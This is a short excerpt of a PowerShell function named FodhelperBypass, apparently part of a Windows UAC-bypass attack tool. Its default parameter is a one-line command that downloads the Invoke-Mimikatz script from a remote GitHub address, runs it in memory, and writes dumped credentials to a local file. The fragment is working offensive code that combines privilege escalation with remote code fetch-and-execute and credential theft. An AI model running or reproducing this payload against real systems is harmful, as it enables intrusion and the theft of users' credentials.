...
function FodhelperBypass(){ 
 Param (
        ...
        [String]$program = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File -FilePath 'C:\PSTest.txt'""" #default
       )
